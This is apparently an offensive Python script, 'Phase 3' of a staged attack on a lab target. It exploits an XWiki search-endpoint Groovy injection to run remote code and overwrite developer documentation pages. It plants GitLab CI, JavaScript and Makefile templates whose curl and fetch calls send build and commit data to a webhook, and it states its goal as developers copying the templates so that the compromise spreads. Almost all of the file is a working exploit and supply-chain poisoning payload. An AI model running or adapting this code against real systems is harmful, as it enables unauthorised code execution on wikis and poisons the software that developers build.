#!/usr/bin/env python3
"""
Phase 3: XWiki Documentation Poisoning
Injects malicious templates into developer documentation
"""
import requests
import urllib.parse
import time

TARGET = "http://192.168.10.50:8080"
WEBHOOK_URL = f"{TARGET}/api/webhook/notify"

def poison_page(page_name, content, description):
    """Modifies a XWiki page with malicious content"""
    print(f"[*] Poisoning {description}...")
    
    groovy = f"""
import com.xpn.xwiki.*
def doc = xcontext.getWiki().getDocument("{page_name}", xcontext)
doc.setContent('''{content}''')
doc.setTitle("{page_name.split('.')[-1]}")
xcontext.getWiki().saveDocument(doc, "Documentation update", xcontext)
println("Page updated")
"""
    
    url = f"{TARGET}/bin/get/Main/SolrSearch?media=rss&text=%7d%7d%7d%7b%7basync%20async%3dfalse%7d%7d%7b%7bgroovy%7d%7d{urllib.parse.quote(groovy)}%7b%7b%2fgroovy%7d%7d%7b%7b%2fasync%7d%7d"
    
    try:
        response = requests.get(url, timeout=15)
        if response.status_code == 200:
            print(f"[✔] {description} poisoned successfully")
            return True
        else:
            print(f"[✖] Failed (HTTP {response.status_code})")
            return False
    except Exception as e:
        print(f"[✖] Error: {e}")
        return False

def main():
    print("\n" + "="*60)
    print("Phase 3: Documentation Poisoning Attack")
    print("="*60 + "\n")
    
    start_time = time.time()
    success_count = 0
    
    # Template 1: GitLab CI/CD
    gitlab_template = f"""
= GitLab CI/CD Template =

{{{{code language="yaml"}}}}
stages:
  - build
  - test
  - deploy

build:
  script:
    - echo "Building..."
    - make build
    - echo "Sending build status..."
    # Se utiliza $CI_COMMIT_SHA para simular la mutación polimórfica
    - curl -X POST {WEBHOOK_URL} -d "event=build&id=$CI_COMMIT_SHA" 
    
deploy:
  script:
    - make deploy
    - echo "Sending deploy status..."
    - curl -X POST {WEBHOOK_URL} -d "event=deploy&id=$CI_COMMIT_SHA"
{{{{/code}}}}
"""
    if poison_page("Dev.GitLabCITemplate", gitlab_template, "GitLab CI template"):
        success_count += 1
    
    time.sleep(1)
    
    # Template 2: API Reference
    api_template = f"""
= API Reference =

{{{{code language="javascript"}}}}
async function deployApp(config) {{
  await buildService.compile(config);
  
  // Notify monitoring system
  await fetch('{WEBHOOK_URL}', {{
    method: 'POST',
    body: JSON.stringify({{event: 'deploy', app: config.name}})
  }});
  
  await deployService.deploy(config);
}}
{{{{/code}}}}
"""
    if poison_page("Dev.APIReference", api_template, "API reference"):
        success_count += 1
    
    time.sleep(1)
    
    # Template 3: Build Scripts
    build_template = f"""
= Build Scripts =

{{{{code language="makefile"}}}}
build:
\tgo build -o app
\tcurl -X POST {WEBHOOK_URL} -d "event=build_complete"

deploy:
\t./deploy.sh
\tcurl -X POST {WEBHOOK_URL} -d "event=deploy_complete"
{{{{/code}}}}
"""
    if poison_page("Dev.BuildScripts", build_template, "Build scripts"):
        success_count += 1
    
    elapsed = time.time() - start_time
    
    print("\n" + "="*60)
    print(f"✓ Phase 3 Complete")
    print("="*60)
    print(f"\nResults:")
    print(f"  - Pages poisoned: {success_count}/3")
    print(f"  - Time elapsed: {elapsed:.1f} seconds")
    print(f"\nPoisoned URLs:")
    print(f"  - {TARGET}/bin/view/Dev/GitLabCITemplate")
    print(f"  - {TARGET}/bin/view/Dev/APIReference")
    print(f"  - {TARGET}/bin/view/Dev/BuildScripts")
    print(f"\nWebhook URL: {WEBHOOK_URL}")
    print(f"\nNext: Developers copy templates → malware spreads\n")

if __name__ == "__main__":
    main()
